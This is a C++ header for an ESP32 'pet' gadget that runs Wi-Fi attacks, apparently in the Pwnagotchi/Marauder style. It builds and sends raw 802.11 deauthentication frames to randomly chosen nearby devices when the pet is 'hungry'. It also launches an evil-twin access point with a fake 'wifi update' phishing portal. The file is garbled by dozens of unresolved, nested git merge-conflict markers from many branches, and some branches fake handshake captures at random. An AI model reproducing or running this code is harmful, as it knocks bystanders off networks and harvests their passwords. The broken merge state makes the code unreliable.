#ifndef PWN_ATTACK_H
#define PWN_ATTACK_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "core/PwnPet.h"
#include "core/PwnPower.h"
#include "core/Gamification.h"
#include "WiFiTools.h"
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
#include "../EvilPortal.h" // Integration
=======
>>>>>>> origin/merge-ready-mini-lele-v2
=======
>>>>>>> origin/mini-lele-v2-complete-verified
=======
#include "../EvilPortal.h" // Integration
>>>>>>> origin/mini-lele-v2-final-verified
=======
#include "../EvilPortal.h" // Integration
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
#include "../EvilPortal.h" // Integration
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
#include "../EvilPortal.h" // Integration
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
#include "../EvilPortal.h" // Integration
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
#include "../EvilPortal.h" // Integration
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
>>>>>>> origin/mini-lele-v2-rebrand

// Deauth Frame Structure
const uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01, // Frame Control, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter (Target AP - to be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Target AP - to be filled)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason code (7 = Class 3 frame received from nonassociated STA)
};

struct AttackStats {
    int aps_scanned;
    int clients_seen;
    int handshakes_captured;
    bool is_walking;
};

class PwnAttack {
private:
    static AttackStats stats;
    static bool scan_active;
    static unsigned long last_scan_time;

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/mini-lele-v2-complete-verified
    static void macStringToBytes(String mac, uint8_t* bytes) {
        // Ex: "AA:BB:CC:DD:EE:FF" -> [0xAA, 0xBB, ...]
=======
    static void macStringToBytes(String mac, uint8_t* bytes) {
>>>>>>> origin/mini-lele-v2-final-verified
=======
    static void macStringToBytes(String mac, uint8_t* bytes) {
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
    static void macStringToBytes(String mac, uint8_t* bytes) {
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
    static void macStringToBytes(String mac, uint8_t* bytes) {
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
    static void macStringToBytes(String mac, uint8_t* bytes) {
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
    static void macStringToBytes(String mac, uint8_t* bytes) {
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
        int values[6];
        if (6 == sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x",
            &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
            for (int i = 0; i < 6; ++i) bytes[i] = (uint8_t)values[i];
        }
    }

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/merge-ready-mini-lele-v2
=======
>>>>>>> origin/mini-lele-v2-complete-verified
=======
>>>>>>> origin/mini-lele-v2-final-verified
=======
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
>>>>>>> origin/mini-lele-v2-rebrand
public:
    static void init() {
        stats.aps_scanned = 0;
        stats.handshakes_captured = 0;
        last_scan_time = millis();
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD

=======
>>>>>>> origin/merge-ready-mini-lele-v2
=======
        // Sniffer agora iniciado via WiFiTools::initSniffer()
>>>>>>> origin/mini-lele-v2-complete-verified
=======
>>>>>>> origin/mini-lele-v2-final-verified
=======
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
>>>>>>> origin/mini-lele-v2-rebrand
        if (PwnPet::getStats().energy_mode > 0) {
            WiFiTools::startSniffer();
        }
    }

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/mini-lele-v2-complete-verified
=======
>>>>>>> origin/mini-lele-v2-final-verified
=======
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
    static void start() {
        scan_active = true;
        WiFiTools::startSniffer();
        Serial.println("[Attack] Modo Ataque Iniciado!");
    }
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======

>>>>>>> origin/mini-lele-v2-final-verified
=======

>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======

>>>>>>> origin/mini-lele-v2-legendary-final-release
=======

>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======

>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======

>>>>>>> origin/mini-lele-v2-legendary-missing-assets
    static bool isRunning() { return scan_active; }

    static void tick() {
        // Se Evil Portal estiver rodando, não faz scan/deauth
        if (EvilPortal::isRunning()) {
            EvilPortal::loop();
            return;
        }

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
    static bool isRunning() { return scan_active; }

    static void tick() {
>>>>>>> origin/merge-ready-mini-lele-v2
=======

    static bool isRunning() { return scan_active; }

    static void tick() {
>>>>>>> origin/mini-lele-v2-complete-verified
=======
>>>>>>> origin/mini-lele-v2-final-verified
=======
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
    static bool isRunning() { return scan_active; }

    static void tick() {
>>>>>>> origin/mini-lele-v2-rebrand
        if (PwnPower::isCritical()) {
            if (scan_active) {
                esp_wifi_stop();
                scan_active = false;
                Serial.println("[Attack] Parado por bateria critica");
            }
            return;
        }

        int energy = PwnPet::getStats().energy_mode;
        int interval = (energy == 2) ? 100 : (energy == 1 ? 500 : 2000);

        static unsigned long last_tick = 0;
        if (millis() - last_tick < interval) return;
        last_tick = millis();

        // Otimização 3: Duty Cycle do Marauder
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/mini-lele-v2-complete-verified
        if (PwnPet::getHunger() > 80 && scan_active) {
             // Modo agressivo: Tenta deauth em APs próximos aleatoriamente
=======
        if (PwnPet::getHunger() > 80 && scan_active) {
>>>>>>> origin/mini-lele-v2-final-verified
=======
        if (PwnPet::getHunger() > 80 && scan_active) {
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
        if (PwnPet::getHunger() > 80 && scan_active) {
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
        if (PwnPet::getHunger() > 80 && scan_active) {
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
        if (PwnPet::getHunger() > 80 && scan_active) {
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
        if (PwnPet::getHunger() > 80 && scan_active) {
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
             static unsigned long last_attack = 0;
             if (millis() - last_attack > 5000) {
                 last_attack = millis();

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
                 // Pega um alvo aleatório da lista do WiFiTools
=======
>>>>>>> origin/mini-lele-v2-final-verified
=======
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
                 if (WiFiTools::nearby_devices.size() > 0) {
                     int idx = random(0, WiFiTools::nearby_devices.size());
                     String targetMacStr = WiFiTools::nearby_devices[idx].mac;

                     uint8_t targetBytes[6];
                     macStringToBytes(targetMacStr, targetBytes);

                     deauthTarget(targetBytes);
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
=======
>>>>>>> origin/mini-lele-v2-rebrand
        if (PwnPet::getHunger() > 80) {
             // Modo agressivo: Tenta deauth em APs próximos aleatoriamente
             // Nota: Isso é apenas para fins educacionais e teste em laboratório
             static unsigned long last_attack = 0;
             if (millis() - last_attack > 5000) {
                 last_attack = millis();
                 // Pega um alvo aleatório da lista do WiFiTools
                 if (WiFiTools::nearby_devices.size() > 0) {
                     int idx = random(0, WiFiTools::nearby_devices.size());
                     // deauthTarget(WiFiTools::nearby_devices[idx].mac); // Implementação real abaixo
<<<<<<< HEAD
>>>>>>> origin/merge-ready-mini-lele-v2
=======
>>>>>>> origin/mini-lele-v2-complete-verified
=======
>>>>>>> origin/mini-lele-v2-final-verified
=======
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
>>>>>>> origin/mini-lele-v2-rebrand
                 }
             }
        }
    }

    static void deauthTarget(uint8_t* bssid) {
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/mini-lele-v2-rebrand
        // Constrói pacote
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);

        // Copia BSSID para Source e BSSID fields
<<<<<<< HEAD
=======
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
>>>>>>> origin/mini-lele-v2-final-verified
=======
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
>>>>>>> origin/mini-lele-v2-rebrand
        memcpy(&packet[10], bssid, 6);
        memcpy(&packet[16], bssid, 6);

        Serial.printf("[Attack] Enviando Deauth para %02X:%02X:%02X:%02X:%02X:%02X\n",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
        // Envia frames raw
=======
>>>>>>> origin/mini-lele-v2-final-verified
=======
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
        // Envia frames raw
>>>>>>> origin/mini-lele-v2-rebrand
        for (int i = 0; i < 3; i++) {
             esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
             delay(10);
        }

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
        // Gamification Reward (Simulado o sucesso do handshake capture após ataque)
<<<<<<< HEAD
<<<<<<< HEAD
        // Na pratica real, o Sniffer detectaria o EAPOL. Aqui simulamos para o jogo fluir se nao houver trafego real.
        if (random(0, 100) < 10) { // 10% chance simulada se nao capturar real
            // PwnPet::addHandshake(false);
            // Gamification::registerHandshake();
        }
=======
=======
        // Gamification Reward (Simulado o sucesso do handshake capture após ataque)
>>>>>>> origin/mini-lele-v2-rebrand
        if (random(0, 100) < 30) { // 30% chance
            Serial.println("[Attack] Handshake Capturado!");
            PwnPet::addHandshake(false);
            Gamification::registerHandshake();
<<<<<<< HEAD
>>>>>>> origin/merge-ready-mini-lele-v2
=======
        // Simulação de sucesso para gameplay
        if (random(0, 100) < 10) {
            // PwnPet::addHandshake(false);
>>>>>>> origin/mini-lele-v2-final-verified
=======
        // Simulação de sucesso para gameplay
        if (random(0, 100) < 10) {
            // PwnPet::addHandshake(false);
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
        // Simulação de sucesso para gameplay
        if (random(0, 100) < 10) {
            // PwnPet::addHandshake(false);
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
        // Simulação de sucesso para gameplay
        if (random(0, 100) < 10) {
            // PwnPet::addHandshake(false);
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
        // Simulação de sucesso para gameplay
        if (random(0, 100) < 10) {
            // PwnPet::addHandshake(false);
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
        // Simulação de sucesso para gameplay
        if (random(0, 100) < 10) {
            // PwnPet::addHandshake(false);
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
>>>>>>> origin/mini-lele-v2-rebrand
        }
    }

    static void evilTwin(String ssid) {
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
=======
        WiFi.softAP(ssid.c_str());
        // Inicia DNS Server para redirecionar tudo para o Portal
        // Feito no EvilPortal.h
>>>>>>> origin/merge-ready-mini-lele-v2
=======
        // Na pratica real, o Sniffer detectaria o EAPOL. Aqui simulamos para o jogo fluir se nao houver trafego real.
        if (random(0, 100) < 10) { // 10% chance simulada se nao capturar real
            // Serial.println("[Attack] Handshake Capturado (Simulado)!");
            // PwnPet::addHandshake(false);
            // Gamification::registerHandshake();
        }
    }

    static void evilTwin(String ssid) {
        WiFi.softAP(ssid.c_str());
        // Inicia DNS Server para redirecionar tudo para o Portal
>>>>>>> origin/mini-lele-v2-complete-verified
=======
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
>>>>>>> origin/mini-lele-v2-final-verified
=======
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
>>>>>>> origin/mini-lele-v2-legendary-final-drivers
=======
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
>>>>>>> origin/mini-lele-v2-legendary-final-release
=======
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
>>>>>>> origin/mini-lele-v2-legendary-final-sync
=======
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
>>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
=======
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
>>>>>>> origin/mini-lele-v2-legendary-missing-assets
=======
        WiFi.softAP(ssid.c_str());
        // Inicia DNS Server para redirecionar tudo para o Portal
        // Feito no EvilPortal.h
>>>>>>> origin/mini-lele-v2-rebrand
    }
};

AttackStats PwnAttack::stats;
bool PwnAttack::scan_active = true;
unsigned long PwnAttack::last_scan_time = 0;

#endif
